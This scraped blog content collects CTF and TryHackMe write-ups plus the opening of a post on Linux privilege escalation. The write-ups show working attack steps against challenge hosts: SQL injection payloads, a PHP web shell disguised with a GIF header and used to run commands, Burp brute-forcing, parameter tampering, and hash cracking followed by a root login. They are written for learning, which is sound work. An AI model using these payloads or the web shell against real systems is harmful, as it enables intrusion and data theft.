\u0026ldquo;GETFLAG\u0026rdquo; and set its value to \u0026ldquo;yes,\u0026rdquo; the server will respond with the flag.\n──(kali㉿iasad)-[~/CTFs/aupctf] └─$ curl -H \u0026#34;GETFLAG: yes\u0026#34; https://challs.aupctf.live/header/ aupCTF{cust0m-he4d3r-r3qu3st} Flag: aupCTF{cust0m-he4d3r-r3qu3st}\nSQLi - 1 (100pts) Description Click Here\nApproach with a simple SQL injection payload we can get the flag ie: ‘or 1=1\nFlag: aupCTF{3a5y-sql-1nj3cti0n}\nSQLi - 2 (200pts) Description Click Here\nApproach this time some restrictions are made but we can still get the flag with this payload. -- or '1'='1'\nFlag: aupCTF{m3d1um-sql-1nj3cti0n}\nTime Heist (100pts) Description use your time travel skills to recover the hidden flag. Click Here\nApproach The description specifically suggests utilizing your time travel skills, indicating the use of archives.org to view this site in its past state.\nBy conducting a search for \u0026ldquo;iasad.me/tags\u0026rdquo; on archives.org, we can access numerous snapshots of the website, including the specific snapshot from May 28th, 2023, where we can find the flag.\nwe can see a tag named flag opening at we find a page that has the flag for us in source code\nFlag: aupCTF{y0u-ar3-4-tru3-t1m3-tr4v3l3r}\nDirectory (200pts) Description The flag is buried in one of the directory. Click Here\nApproach The provided website has 1000 subdirectories, and only one of them contains the flag. We can write a Python script to check all the subdirectories.\nscript.py\nimport requests base_url = \u0026#34;https://challs.aupctf.live/dir/page/\u0026#34; format = \u0026#34;aupCTF{\u0026#34; pages = 1000 def visit_page(page_number): url = base_url + str(page_number) + \u0026#34;/\u0026#34; print(f\u0026#34;Checking: {url}\u0026#34;) response = requests.get(url) if response.status_code == 200 and format in response.text: print(f\u0026#34;Found flag on page {page_number}!\u0026#34;) print(response.text) exit() for page_number in range(1, pages + 1): visit_page(page_number) output\n┌──(kali㉿iasad)-[~/CTFs/aupctf/the-chosen-one] └─$ python script.py -------------------------------------------------- Checking: https://challs.aupctf.live/dir/page/709/ Checking: https://challs.aupctf.live/dir/page/710/ Checking: https://challs.aupctf.live/dir/page/711/ Checking: https://challs.aupctf.live/dir/page/712/ Found flag on page 712! \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;You Found Me\u0026lt;/title \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Here is your flag, You deserve it\u0026lt;/h1\u0026gt; \u0026lt;br\u0026gt; \u0026lt;h2\u0026gt;The flag is: aupCTF{d1r3ct0r13s-tr1v14l-fl4g}\u0026lt;/h2\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Threading can be used to enhance the speed of the process.\nFlag: aupCTF{d1r3ct0r13s-tr1v14l-fl4g}\nConundrum (300pts) Description Superuser\nApproach we are presented with a login page. some digging and you find robots.txt that has 2 disallowed entries.\nNow that we have wordlists for username and password, we can proceed to initiate a brute-force attack. By examining the payload of the form, we observe that it includes three fields: username, password, and a CSRF token.\nThe situation becomes interesting due to the presence of CSRF protection, which prevents us from directly brute-forcing the login using conventional methods such as Hydra\nBut Burp Suite\u0026rsquo;s Intruder tool can perform brute-force attack in this scenario easily.\nTo begin, set the attack type to \u0026ldquo;cluster bomb\u0026rdquo; within Burp Suite Intruder. Define the payload positions for both the username and password fields.\nNext, configure the payload sets for the username and password fields. This allows you to input a list of possible values for each field, which will be iterated through during the attack.\nOnce the configurations are in place, initiate the attack by clicking the \u0026ldquo;Start Attack\u0026rdquo; button.\nDuring the attack, carefully observe the response length. It serves as an indicator for a successful attempt.\nEven though if you managed to log in with the username \u0026ldquo;starlord69\u0026rdquo; and the password \u0026ldquo;1A8$5k7!eR\u0026rdquo;, unfortunately, No flag yet.\nHowever, it suggests that we need to log in as an admin to obtain the flag. To accomplish this, we can include the payload \u0026ldquo;admin=True\u0026rdquo; in our login request.\nFlag: aupCTF{V1ct0ri0usChall3ng3r!}\n","permalink":"https://iasad.me/write-ups/aupctf/web/","summary":"writeups for web challenges","title":"Web - aupCTF"},{"content":"\rInfo\rName: Impossible\rDifficulty: Medium\rPoints: 50\rCategory: Cryptography\rDescription Is this challenge impossible?\nnc challs.actf.co 32200\nimpossible.py\nApproach source code\ndef fake_psi(a, b): return [i for i in a if i in b] def zero_encoding(x, n): ret = [] for i in range(n): if (x \u0026amp; 1) == 0: ret.append(x | 1) x \u0026gt;\u0026gt;= 1 return ret def one_encoding(x, n): ret = [] for i in range(n): if x \u0026amp; 1: ret.append(x) x \u0026gt;\u0026gt;= 1 return ret print(\u0026#34;Supply positive x and y such that x \u0026lt; y and x \u0026gt; y.\u0026#34;) x = int(input(\u0026#34;x: \u0026#34;)) y = int(input(\u0026#34;y: \u0026#34;)) if len(fake_psi(one_encoding(x, 64), zero_encoding(y, 64))) == 0 and x \u0026gt; y and x \u0026gt; 0 and y \u0026gt; 0: print(open(\u0026#34;flag.txt\u0026#34;).read()) we need to satisfy 3 conditions to get the flag\nx must be greater than y. Both x and y must be positive The length of the list returned by fake_psi should be 0.\nfake_psi(one_encoding(x, 64), zero_encoding(y, 64)) We can set y to 1, which means that zero_encoding(y, 64) returns a list of 64 ones, where there are 64 ones in total.\nTo satisfy the condition that fake_psi should return an empty list, we need to find a value of x such that one_encoding(x, 64) returns an empty list. The one_encoding function only appends to the list if the least significant bit of x is 1, so we need to set the 64 least significant bits of x to 0.\nWe can set x to 1 \u0026lt;\u0026lt; 64, which means shifting the binary representation of 1 64 bits to the left, effectively adding 64 zeros to the end. Therefore, x is equal to 18446744073709551616.\nSo, to obtain the flag, you should enter x as 18446744073709551616 and y as 1.\n┌──(kali㉿iasad)-[~/CTFs/angstorm] └─$ nc challs.actf.co 32200 Supply positive x and y such that x \u0026lt; y and x \u0026gt; y. x: 18446744073709551616 y: 1 actf{se3ms_pretty_p0ssible_t0_m3_7623fb7e33577b8a} Flag: actf{se3ms_pretty_p0ssible_t0_m3_7623fb7e33577b8a}\n","permalink":"https://iasad.me/write-ups/ctftime/angstromctf/impossible/","summary":"Write-up on cryptography challenge Impossible.","title":"Impossible - ångstromCTF"},{"content":"\rInfo\rName: Zaza\rDifficulty: Easy\rPoints: 50\rCategory: Rev\rDescription Bedtime!\nnc challs.actf.co 32760\nzaza\nApproach the program makes some checks before giving us flag\ncheck#1\nthe program prompts I'm going to sleep. Count me some sheep:\nlooking into the binary we find that the number is 4919\ncheck#2\nit then prompts Nice, now reset it. Bet you can't: it asks for x such that x * 4919 ≠ 1\ncheck#3\nit then asks Okay, what's the magic word? looking it the binary we can see that it perform xor on a string with a key\nafter the xor we got the magic words\n┌──(kali㉿iasad)-[~/CTFs/angstorm] └─$ nc challs.actf.co 32760 I\u0026#39;m going to sleep. Count me some sheep: 4919 Nice, now reset it. Bet you can\u0026#39;t: 1 Okay, what\u0026#39;s the magic word? SHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPSHEEPkd actf{g00dnight_c7822fb3af92b949} Flag: actf{g00dnight_c7822fb3af92b949}\n","permalink":"https://iasad.me/write-ups/ctftime/angstromctf/zaza/","summary":"Write-up on Rev challenge Zaza.","title":"Zaza - ångstromCTF"},{"content":"\rInfo\rName: Simon says\rDifficulty: Easy\rPoints: 40\rCategory: Misc\rDescription This guy named Simon gave me a bunch of tasks to complete and not a lot of time. He wants to run a unique zoo but needs the names for his animals. Can you help me?\nnc challs.actf.co 31402\nApproach when we connect to the server using nc we receive a prompt: Combine the first 3 letters of {animal name} with the last 3 letters of {animal name}\nHowever, we are need to provide the correct answer within 5 seconds and repeat this more than 10 times. Manually doing this task is not feasible, but this can be easily automated with a python script\n#!/usr/bin/env python3 import socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((\u0026#39;challs.actf.co\u0026#39;, 31402)) while True: response = s.recv(1024).decode().strip() if response.startswith(\u0026#34;actf{\u0026#34;): print(f\u0026#34;Received flag: {response}\u0026#34;) break words = response.split() if len(words) \u0026lt; 7: print(f\u0026#34;Invalid response: {response}\u0026#34;) break answer = f\u0026#34;{words[6][:3]}{words[-1][-3:]}\u0026#34; print(f\u0026#34;Request: {response}\u0026#34;) print(f\u0026#34;Response: {answer}\u0026#34;) print(\u0026#34;\\n\u0026#34;) s.sendall(answer.encode() + b\u0026#34;\\n\u0026#34;) s.close() I attempted to run the script on my local machine, but didn\u0026rsquo;t recieved any flag. However, when I used Google Shell, it worked without any issues. I think this could be latency issue.\nFlag: actf{simon_says_you_win}\n","permalink":"https://iasad.me/write-ups/ctftime/angstromctf/simon-says/","summary":"Write-up on Misc challenge simon says.","title":"Simon says - ångstromCTF"},{"content":"\rInfo\rName: Celeste Speedrunning Association\rDifficulty: Easy\rPoints: 20\rCategory: Web\rDescription I love Celeste Speedrunning so much!!! It\u0026rsquo;s so funny to watch!!!\nHere\u0026rsquo;s my favorite site!\nApproach Upon examining the Source Code, it appears that the website is utilizing a hidden input field called \u0026ldquo;start\u0026rdquo; that utilizes the Unix epoch time to verify the present time.\nOnce the button is clicked, the server calculates the duration from the start time to when the request is received by the server. If the duration is less than 0 sec the flag will be displayed. However, this can only be accomplished by modifying the epoch value to a future time (higher value), then send the data to server\nThis can be done using a simple Python script.\nimport requests url = \u0026#39;https://mount-tunnel.web.actf.co/submit\u0026#39; data = {\u0026#39;start\u0026#39;: \u0026#39;16825199999\u0026#39;} response = requests.post(url, data=data) print(response.text) Flag: actf{wait_until_farewell_speedrun}\n","permalink":"https://iasad.me/write-ups/ctftime/angstromctf/csa/","summary":"Write-up on web challenge Celeste Speedrunning Association.","title":"Celeste Speedrunning Association - ångstromCTF"},{"content":"\rInfo\rName: shortcircuit\rDifficulty: Easy\rPoints: 40\rCategory: Web\rDescription Bzzt\nApproach Looking at Source Code the JavaScript performs some manipulations on the input password by breaking it up into chunks and swapping characters around. The challenge requires reversing these manipulations to obtain the original password. This can be achieved by analyzing the JavaScript code and writing a Python script to reverse the manipulations.\nHere\u0026rsquo;s a Python script that reverses the operations of chunking and swapping on the given hard-coded string to obtain the original string.\ndef reverse_swap(x): t = x[2] x[2] = x[3] x[3] = t t = x[3] x[3] = x[1] x[1] = t t = x[1] x[1] = x[2] x[2] = t t = x[0] x[0] = x[3] x[3] = t return x def reverse_chunk(x, n): return \u0026#39;\u0026#39;.join(x) password = \u0026#39;7e08250c4aaa9ed206fd7c9e398e2}actf{cl1ent_s1de_sucks_544e67ef12024523398ee02fe7517fffa92516317199e454f4d2bdb04d9e419ccc7\u0026#39; password_chunks = [password[i:i+30] for i in range(0, len(password), 30)] password_chunks = reverse_swap(password_chunks) password = reverse_chunk(password_chunks, 30) print(password) Flag:actf{cl1ent_s1de_sucks_544e67e6317199e454f4d2bdb04d9e419ccc7f12024523398ee02fe7517fffa92517e08250c4aaa9ed206fd7c9e398e2}\n","permalink":"https://iasad.me/write-ups/ctftime/angstromctf/shortcircuit/","summary":"Write-up on web challenge shortcircuit.","title":"shortcircuit - ångstromCTF"},{"content":"\rInfo\rName: gif\rDifficulty: Hard\rPoints: 272\rCategory: Web\rDescription I made a secure php web app where I can upload all my gifs. Some people on the internet told me to run it in a docker container just to protect it from my personal files, but who cares.\nApproach At first, I uplaoded a Gif fie which was uploaded successfully then I attempted to upload a basic PHP payload and got this error\nfrom the error we can see that the files are stored at /uploads.\nAs the server only permitted GIF files.I modified the payload by adding a GIF header, GIF87a;.\nGIF87a; \u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]) ?\u0026gt; And it worked we got remote code execution. We can now execute commands on the machine\nwe can find the flag at: /uploads/payload.php/?cmd=cat /flag.txt\nFlag: bucket{1_h4t3_PHP}\n","permalink":"https://iasad.me/write-ups/ctftime/bucketctf/gif/","summary":"Write-up on web challenge gif tackling a file upload vulnerability.","title":"Gif  - BucketCTF"},{"content":"\rInfo\rName: TBDLCG\rDifficulty: Easy\rPoints: 200\rCategory: cryptography\rDescription I created a tennis game. BLAHFALJFAJDFLBLAHAOIFLJFDA - is that random enough for you?\nApproach we are given a container that we can connect to using netcat\n┌──(kali㉿iasad)-[~/CTFs/BucketCTF/crypto/TBDLCG] └─$ nc 213.133.103.186 5766 You are playing a game of table tennis against Cogsworth64 AI bot. The bot is only able to serve the ball, because Cogsworth64 disabled . The bot will send a certain spin (represented by a number 0-8) and location (represented by a number 0-8) at each point. If you can guess the spin and location, you win the point. If you can not, the bot wins the point. The first player to win 20 points wins the game. Try not to lose. Your score: 0 Bot\u0026#39;s score: 0 What is your guess for location? Initially, I spent some time experimenting with the game to understand its workings. then I assigned a very large negative value to both the location and spin variables. After executing two turns, I noticed that the bot position and spin values remained fixed at 3. Based on this observation, I deduced that inputting 3 as the values for both variables would result in a win every time. and hence I got the flag\nWhat is your guess for location?-999999 What is your guess for spin?-999999 You lose the point! The bot\u0026#39;s spin was 3 and location was 3 Your score: 0 Bot\u0026#39;s score: 1 What is your guess for location?3 What is your guess for spin?3 You win the point! Your score: 1 Bot\u0026#39;s score: 1 What is your guess for location?3 3What is your guess for spin? You win the point! Your score: 2 Bot\u0026#39;s score: 1 What is your guess for location?3 3What is your guess for spin? 3You win the point! Your score: 3 Bot\u0026#39;s score: 1 What is your guess for location?3 What is your guess for spin?3 You lose the point! The bot\u0026#39;s spin was 3 and location was 3 Your score: 3 Bot\u0026#39;s score: 2 What is your guess for location?33 What is your guess for spin?3 You lose the point! The bot\u0026#39;s spin was 3 and location was 3 Your score: 3 Bot\u0026#39;s score: 3 What is your guess for location?3 3What is your guess for spin? You win the point! Your score: 4 Bot\u0026#39;s score: 3 What is your guess for location?3 What is your guess for spin?3 You win the point! You win the game! b\u0026#39;bucket{#1_victory_royale_86f2b88341d8d}\\n\u0026#39; Flag: bucket{#1_victory_royale_86f2b88341d8d}\n","permalink":"https://iasad.me/write-ups/ctftime/bucketctf/tbdlcg/","summary":"Write-up on cryptography challenge TBDLCG.","title":"TBDLCG - BucketCTF"},{"content":"\rInfo\rName: Schematic\rDifficulty: Easy\rPoints: 284\rCategory: Misc\rDescription I build a tnt cannon, how many dispensers am I using.\nformat: bucket{number_goes_here}\nDownload Attachments here\rApproach we are given a .schematic file and we have to count the number of dispensers used.\nSchematic💡\nA schematic is a type of file format used to represent a 3D object or structure in Minecraft, It contains a blueprint or schematic of a Minecraft build.\nTools such as MCEdit and WorldEdit can be used to analyze .schematic files, and there are also several online sites that offer the same functionality.\nI oped the file in cubical.xyz\rbut I had to manually count the dispensers, So I looked for alternatives and discovered Mineprints\rwhich conveniently displayed the number of dispensers used in the schematic.\nFlag bucket{2238}\n","permalink":"https://iasad.me/write-ups/ctftime/bucketctf/schematic/","summary":"Write-up on Misc challenge Schematic.","title":"Schematic - BucketCTF"},{"content":"\rInfo\rName: Detective\rDifficulty: Easy\rPoints: 200\rCategory: Misc\rDescription Watson: The criminal\u0026rsquo;s wiped down the crime scene! How can we find them now? Holmes: Elementary, my dear Watson\nDownload Attachments here\rApproach As this was a steganography challenge and the image appeared to be plain white, I decided to use stegsolve.jar to check for any hidden data in the color channels separately and discovered the flag within the red plane 0\nto install stegsolve\rwget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar chmod +x stegsolve.jar mkdir bin mv stegsolve.jar bin/ Flag: bucket{r3plAc3_c0L0Rs!!}\n","permalink":"https://iasad.me/write-ups/ctftime/bucketctf/detective/","summary":"Write-up on stegonograpy challenge Detective.","title":"Detective - BucketCTF"},{"content":"\rInfo\rName: Minecraft\rDifficulty: Easy\rPoints: 200\rCategory: Misc\rDescription I just started playing Minecraft for my computer science class and forgot to remove a sign with my password before exiting the world. Could you please check what my password is.\nDownload Attachments here\rApproach The file was named bucketctfMC.mcworld and had a file extension of .mcworld However, upon checking the file type, I discovered that it was actually a zip file in disguise. To access its contents, I simply renamed the file extension to .zip and extracted it.\n┌──(kali㉿iasad)-[~/CTFs/BucketCTF] └─$ file bucketctfMC.mcworld bucketctfMC.mcworld: Zip archive data, at least v4.5 to extract ┌──(kali㉿iasad)-[~/CTFs/BucketCTF] └─$ mv bucketctfMC.mcworld bucketctfMC.zip ┌──(kali㉿iasad)-[~/CTFs/BucketCTF] └─$ unzip bucketctfMC.zip Archive: bucketctfMC.zip inflating: db/000003.log inflating: db/CURRENT inflating: db/MANIFEST-000002 inflating: level.dat inflating: level.dat_old inflating: levelname.txt inflating: world_icon.jpeg one particularly interesting file was db/000003.log so I checked its contents using glogg tool. I just searched for bucket in the logs and got the flag\nFlag: bucket{1L0V3MIN3CRAFT_1c330e9105f1}\n","permalink":"https://iasad.me/write-ups/ctftime/bucketctf/minecraft/","summary":"Write-up on Misc challenge Minecraft.","title":"Minecraft - BucketCTF"},{"content":"\rInfo\rName: Apps\rDifficulty: Easy\rPoints: 200\rCategory: Misc\rDescription I made a small app when I was 9 years old first learning to code.\nDownload Attachments here\rApproach The CTF.asa file was, in fact, a zip archive containing the application source code. Upon extraction of the archive, the flag was discovered in the screen1.bky file located within the src directory.\nFlag: bucket{M1T_4PP_1NV3NT0R_bf0285c53}\n","permalink":"https://iasad.me/write-ups/ctftime/bucketctf/apps/","summary":"Write-up on Misc challenge Apps.","title":"Apps - BucketCTF"},{"content":"\rInfo\rName: Adventures Of Kencypher\rOS: Linux\rDifficulty: Beginner Friendly\rPoints: 720\rLink: TryHackMe\rDescription: challanges on web, crypto, stego and OSINT\rTask 1 - Green Day Was My First Rock OSINT To gather OSINT on the author Waleed Amjad\r, a quick search for \u0026ldquo;Kencypher\u0026rdquo; on Google yields his LinkedIn, Medium, and Youtube profiles, providing all the necessary information.\nOSINT - 1 Find Kencypher Linkedin Profile Whats Username?\nAnswer: Waleed\nOSINT - 2 Which University Kencypher Studies?\nAnswer: Muhammad Nawaz Shareef University of Agriculture, Multan\nOSINT - 3 What Is Name Of First Blog Written By Kencypher?\nAnswer: Time Is A Myth\nOSINT - 4 How Many Blogs Has He Published So Far?\nAnswer: 14\nOSINT - 5 Did The XSS Rat Interviewed Kencypher?\nAnswer: Yes\nOSINT - 6 Kencypher Has Youtube Channel What Is Title Of His First Video?\nAnswer: Introduction Of TryHackMe and Channel In Urdu\nTask 2 - Jurassic Crypto Crypto - 1 WVZOQ2EySXpaSFZpUnpsb1drZFdhMGxJU21oaVUwSXpZVWRXZFVsSGEyZGtNa1o2U1VSWlBRPT0= it is a nested base64 code I used Cyberchef\rto decode it\nAnswer: i downloaded ram when i was 6\nCrypto - 2 a61ae0b2c69dacd329d4c216da959665c9d94b5935a47368af02c102e922e209\nWell Its Something About BestFriend Perhaps Its A Key\nthe hint suggested “RC2 Key Was Given In Question” so I again used Cyberchef\rrc2 decrypt with key “BestFriend” to decrypt it\nAnswer: First Best Friend Was Abdullah\nCrypto - 3 $G678 %?KC y?7 +C8?J7J9E q2 !3G2 +?AFG2C the hint suggested “Rotatory 47 And Rotatory 13 Combined To Form A Duo” so I first used rot-47 then rot-13\nAnswer: First Game Was Metalslug On Coin Machine\nCrypto - 4 -- -.-- ..-. .- ...- --- ..- .-. .. - . - --- -.-- .-- .- ... -.-- --- -.-- --- again used Cyberchef\rand converted from morse\nAnswer: MY FAVOURITE TOY WAS YOYO\nCrypto - 5 ++++++++++[\u0026gt;+\u0026gt;+++\u0026gt;+++++++\u0026gt;++++++++++\u0026laquo;\u0026laquo;-]\u0026raquo;\u0026gt;++++++++.\u0026gt;+++++.\u0026mdash;\u0026mdash;.++++++++.+++.\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-.++++++++++++.\u0026mdash;\u0026mdash;\u0026ndash;.\u0026laquo;++.\u0026gt;\u0026mdash;\u0026ndash;.\u0026gt;++++++++++++++.\u0026laquo;.\u0026gt;++++++++++++++.++++++++++.\u0026gt;\u0026mdash;\u0026mdash;-..+++++++++++++.\nfor this one I did not knew what it is so I used Cipher Identifier\rwhich suggested it is an encryption called brainfuck\nso I used Brainfuck Interpreter\rto decode it\nAnswer: Nickname Is Wally\nCrypto - 6 Well This Is Big Program With Key \u0026ldquo;cartoon”\nonverted from binary using Cyberchef\nOutput C program\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; string encrypt(string msg, string key) { string encrypted_msg = \u0026#34;\u0026#34;; int j = 0; for (int i = 0; i \u0026lt; msg.length(); i++) { encrypted_msg += msg[i] ^ key[j]; j = (j + 1) % key.length(); } return encrypted_msg; } string decrypt(string msg, string key) { string decrypted_msg = \u0026#34;\u0026#34;; int j = 0; for (int i = 0; i \u0026lt; msg.length(); i++) { decrypted_msg += msg[i] ^ key[j]; j = (j + 1) % key.length(); } return decrypted_msg; } int main() { string prompt = \u0026#34;\\x4d\\x79\\x20\\x46\\x61\\x76\\x20\\x43\\x61\\x72\\x74\\x6f\\x6f\\x6e\\x20\\x49\\x73\\x20\\x42\\x65\\x6e\\x20\\x31\\x30\u0026#34;; string key = \u0026#34;cartoon\u0026#34;; string encrypted_prompt = encrypt(prompt, key); string input_key; cout \u0026lt;\u0026lt; \u0026#34;Enter the key: \u0026#34;; cin \u0026gt;\u0026gt; input_key; transform(input_key.begin(), input_key.end(), input_key.begin(), ::tolower); if (input_key == key) { string decrypted_prompt = decrypt(encrypted_prompt, key); cout \u0026lt;\u0026lt; decrypted_prompt \u0026lt;\u0026lt; endl; } else { cout \u0026lt;\u0026lt; \u0026#34;Get the hell outta here!\u0026#34; \u0026lt;\u0026lt; endl; } return 0; } We were given a lengthy binary string which, upon conversion, produced a C program. After compiling and running the program, it prompted us for a key, which we found in the description to be \u0026ldquo;cartoon\u0026rdquo;. Upon providing the correct key, the program outputted the following message: \u0026ldquo;My Fav Cartoon Is Ben 10\u0026rdquo;.\nAnswer: My Fav Cartoon Is Ben 10\nTask 3 - GTA Steg GTA Was My First Game. It Was GTA Sandreas. \u0026ldquo;Ahh Shit Here We Go Again\u0026rdquo;. I Have Some Images From This Memory Sequence. Gather All The Fragments. download challenge files here\rSteg - 1 Who Is Character In Image1.jpg?\nThe Character In Image is the Main Antagonist Of This Game named Big Smoke\nAnswer: Big Smoke\nSteg - 2 What Is Content Of Grains.txt?\nthe grains.txt is embedded in the gym.jpg file we can extract the hidden data using steghide\n┌──(kali㉿iasad)-[~/CTFs/tryhackme/kencipher/gta] └─$ steghide extract -sf gym.jpg Enter passphrase: wrote extracted data to \u0026#34;grains.txt\u0026#34;. ┌──(kali㉿iasad)-[~/CTFs/tryhackme/kencipher/gta] └─$ cat grains.txt People Are Temporary Grains Are Eternal Answer: People Are Temporary Grains Are Eternal\nSteg - 3 What Is Content Of America.txt?\nPassphrase Is Name Of Final Mission Of This Game\nagain the data can be extracted with steghide. this time The Passphrase Is Name Of Final Mission Of This Game which is End of the Line\n┌──(kali㉿iasad)-[~/CTFs/tryhackme/kencipher/gta] └─$ steghide extract -sf guns.jpg Enter passphrase: wrote extracted data to \u0026#34;america.txt\u0026#34;. ┌──(kali㉿iasad)-[~/CTFs/tryhackme/kencipher/gta] └─$ cat america.txt Same Place I Buy My Pants Homes This Is America Answer: Same Place I Buy My Pants Homes This Is America\nSteg - 4 Look Inside Gang.jpg\nI looked into it using string command and found this\n┌──(kali㉿iasad)-[~/CTFs/tryhackme/kencipher/gta] └─$ cat gang.jpg Exif 0210 \u0026#34;PUo520a U\\d\\}GG /=*Y nu7V 337] 0Dh. :)ii; LlpsQ99 Welcome To Sanandreas Im CJ From Groove Street Answer: Welcome To Sanandreas Im CJ From Groove Street\nSteg - 5 What Is Object In police.tar.gz?\nby looking the filetype using file command I found out that it is a jpg not a tar\nso I just changed the extension and opened it\n┌──(kali㉿iasad)-[~/CTFs/tryhackme/kencipher/gta] └─$ file police.tar.gz police.tar.gz: JPEG image data, JFIF standard 1.01, aspect ratio mv police.tar.gz police.jpg Answer: Helicopter\nTask 4 - Collage Fuzz A custom wordlist was given for this task, so I decided to perform subdirectory enumeration using Durb and was able to discover three interesting pages.\n┌──(kali㉿iasad)-[~/CTFs/tryhackme/kencipher] └─$ dirb http://10.10.24.112/ wordlist.txt ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Sat Apr 8 15:45:06 2023 URL_BASE: http://10.10.24.112/ WORDLIST_FILES: wordlist.txt ----------------- GENERATED WORDS: 33 ---- Scanning URL: http://10.10.24.112/ ---- ==\u0026gt; DIRECTORY: http://10.10.24.112/nishat/ ==\u0026gt; DIRECTORY: http://10.10.24.112/singing/ ==\u0026gt; DIRECTORY: http://10.10.24.112/guns/ END_TIME: Sat Apr 8 15:46:00 2023 DOWNLOADED: 132 - FOUND: 0 Whats The Song On One Of Web Pages? on subdirectory /singing found this\nthe song playing on the page was minority from band green day\nWhat Is Decoded Morse Code? on subdirectory /nishat found this in the page source.\nthe morse code translated to : THE FINAL COUNT DOWN\nWhat Is Hidden Text? on subdirectory /guns found the answer in h1 of page\nAnswer : ROCK YOU LIKE A HURRICANE\nTask 5 - You Give Love A Bad Name (Web) lightsaber123\nDont Let Go Of This String It Will Help You. Im Afraid I Cannot Guide You Any Further You Have To Proceed Without Me.\nGood Luck\nNmap Scan ┌──(kali㉿iasad)-[~/CTFs/tryhackme/kencipher] └─$ nmap -A 10.10.120.178 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-08 15:00 EDT Nmap scan report for 10.10.120.178 (10.10.120.178) Host is up (0.29s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 6cc11cdbcd40579843a894400083cd18 (RSA) | 256 35decdf59c546f9ad272df63e1fcbc04 (ECDSA) |_ 256 f032f5d727adcd4777e6e8baa275f2a3 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: OuterSpace Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Nmap done: 1 IP address (1 host up) scanned in 36.60 seconds User Flag from nmap scan we know ssh is open and the user flag is called yoda flag so yoda must be a user. now for the password I tried brute forcing with hydra but got no success. then I saw something in the description lightsaber123 I tried it as a password and success! got the user flag\n┌──(kali㉿iasad)-[~/CTFs/tryhackme/kencipher] └─$ ssh yoda@10.10.8.0 yoda@10.10.8.0\u0026#39;s password: Last login: Thu Aug 4 11:36:40 2022 yoda@rickroll:~$ yoda@rickroll:~$ ls flag.txt +sudo.txt yoda@rickroll:~$ cat flag.txt MNS{C1MB3R} Yoda flag: MNS{C1MB3R}\nRoot Flag there was another file +sudo.txt\nyoda@rickroll:~$ cat +sudo.txt e8885ce0fe2668e5e7ac322f2574d259 this is sudo password LMAO JUST KIDDING BUT IT IS IM NOT KIDDING ITS MASKED the string was an md4 hash so I cracked it with John and found the password for the root horizon I used su to switch to root and got the flag\n┌──(kali㉿iasad)-[~/CTFs/tryhackme/kencipher] └─$ john hash.txt --format=Raw-md4 --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (Raw-MD4 [MD4 128/128 AVX 4x3]) Warning: no OpenMP support for this hash type, consider --fork=4 Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status horizon (?) 1g 0:00:00:00 DONE (2023-04-08 17:48) 100.0g/s Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. yoda@rickroll:~$ su Password: root@rickroll:/home/yoda# cd root@rickroll:~# ls flag.txt snap root@rickroll:~# cat flag.txt MNS{R0OT_B43ACH3D_OOPS} Root Flag: MNS{R0OT_B43ACH3D_OOPS}\nWeb Flag now for the web flag I looked in /var/www/html where I found some interesting folders. i checked all but found the flag in /space/ride/pocket/index.html\nWeb Flag: MNS{w3b_h4cked}\nConclusion I hope you found my writeup informative and please feel free to share your thoughts in the comments. Special thanks to kencypher69\rfor creating these fantastic challenges.\n","permalink":"https://iasad.me/write-ups/tryhackme/adventures-of-kencypher/","summary":"my writeup for cybrovert ctf challenges included osint, web, crypto and steg.","title":"Adventures Of Kencypher - TryHackMe"},{"content":" Introduction Privilege escalation is not a one-step process, nor is it a simple one. It\u0026rsquo;s a journey that requires patience, persistence, and a thorough understanding of the target system\u0026rsquo;s configuration. There\u0026rsquo;s no one-size-fits-all approach, and much of it relies on specific system settings, such as the kernel version, installed applications, supported programming languages, and other users\u0026rsquo; passwords.\nIn this blog post, we aim to cover the main privilege escalation vectors and give you a better understanding of the process. Whether you\u0026rsquo;re participating in CTFs, taking certification exams, or working as a penetration tester, mastering this new skill will undoubtedly become an essential part of your arsenal.\nThe road to privilege escalation requires patience, determination, and a solid knowledge of various techniques and tools. But once you\u0026rsquo;ve gained access to the coveted root shell, you\u0026rsquo;ll have unlocked a whole new level of control and power over the target system.\nWhat is Privilege escalation? Privilege escalation refers to the process of gaining higher levels of permission or access from a lower permission account. Technically, it involves exploiting vulnerabilities, design flaws, or configuration oversights in an operating system or application to gain unauthorized access to resources that are typically restricted from users.\nBut why is privilege escalation important? In the real world of penetration testing, it\u0026rsquo;s rare to gain direct administrative access from the initial foothold. That\u0026rsquo;s where privilege escalation comes in as a crucial step. With system administrator levels of access, you can perform actions such as resetting passwords, bypassing access controls to compromise protected data, editing software configurations, enabling persistence, changing the privilege of existing or new users, and executing any administrative command.\nIn short, understanding privilege escalation is essential for successful penetration testing and maintaining system security. Knowing the ins and outs of this process can help you uncover vulnerabilities and weaknesses in your system\u0026rsquo;s security and address them before they can be exploited by malicious actors.\nTypes of Privilege Escalation Privilege escalation can occur through different methods. two main types are vertical privilege escalation and horizontal privilege escalation\nvertical privilege escalation: also known as privilege elevation. In this scenario, an attacker compromises a user account on a system that has limited shell permissions. The attacker then searches for ways to increase their privileges using the same account. For instance, they may modify the sudoers file to grant themselves the ability to execute commands as a super-user or leverage setuid and setgid special permission bits to run an executable as a privileged user. horizontal privilege 